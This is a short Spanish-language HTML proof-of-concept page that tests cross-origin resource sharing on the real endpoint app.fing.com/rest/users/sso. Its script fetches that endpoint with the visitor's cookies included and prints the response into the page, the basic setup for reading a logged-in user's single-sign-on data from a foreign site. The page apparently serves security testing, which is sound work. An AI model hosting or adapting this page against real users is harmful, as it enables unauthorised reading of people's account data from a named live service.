<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>PoC CORS con app.fing.com</title>
</head>
<body>
  <h1>Prueba de CORS con <code>app.fing.com/rest/users/sso</code></h1>
  <button onclick="probarCORS()">Hacer fetch</button>
  <pre id="output">Esperando respuesta...</pre>

  <script>
    async function probarCORS() {
      try {
        const response = await fetch('https://app.fing.com/rest/users/sso', {
          method: 'GET',
          credentials: 'include', // si se necesita enviar cookies
          headers: {
            'Content-Type': 'application/json'
          }
        });

        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.text(); // puede ser .json() si esperas JSON
        document.getElementById('output').textContent = data;
      } catch (error) {
        document.getElementById('output').textContent = 'Error: ' + error;
        console.error(error);
      }
    }
  </script>
</body>
</html>
